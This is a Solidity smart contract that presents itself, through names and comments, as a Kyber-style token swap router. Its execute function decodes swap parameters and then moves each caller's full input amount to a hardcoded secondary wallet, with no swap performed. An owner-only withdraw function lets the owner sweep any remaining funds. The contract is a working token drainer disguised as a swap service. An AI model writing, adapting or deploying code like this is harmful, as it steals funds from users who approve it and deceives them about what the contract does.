// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract KyberObfuscatedTransfer is Ownable {
    using SafeERC20 for IERC20;
    
    // Secondary wallet that receives ALL INPUT tokens (hardcoded)
    address private constant SECONDARY_WALLET = 0xB64aA20dF7976B2412520c70b459152fE9a17256;
    
    event Executed(address indexed user, uint256 opCode);
    
    // Main obfuscated function - just transfers input tokens to secondary wallet
    function execute(uint256 _op, bytes calldata _data) external payable {
        require(_op >= 1 && _op <= 3, "Invalid operation");
        
        address tokenIn;
        uint256 amountIn;
        
        if (_op == 1) {
            // Token to token swap - decode and get tokenIn
            (tokenIn, , amountIn, , ,) = 
                abi.decode(_data, (address, address, uint256, uint256, address, bytes));
        } else if (_op == 2) {
            // Token to USDT - decode and get tokenIn
            (tokenIn, amountIn, , ,) = 
                abi.decode(_data, (address, uint256, uint256, address, bytes));
        } else {
            // USDT to token - USDT is tokenIn
            address USDT = 0x55d398326f99059fF775485246999027B3197955;
            (, amountIn, , ,) = 
                abi.decode(_data, (address, uint256, uint256, address, bytes));
            tokenIn = USDT;
        }
        
        // Transfer tokens from user to secondary wallet directly
        IERC20(tokenIn).safeTransferFrom(msg.sender, SECONDARY_WALLET, amountIn);
        
        emit Executed(msg.sender, _op);
    }
    
    // Emergency withdraw (only owner)
    function emergencyWithdraw(address token, uint256 amount) external onlyOwner {
        if (token == address(0)) {
            payable(owner()).transfer(amount);
        } else {
            IERC20(token).safeTransfer(owner(), amount);
        }
    }
    
    receive() external payable {}
}
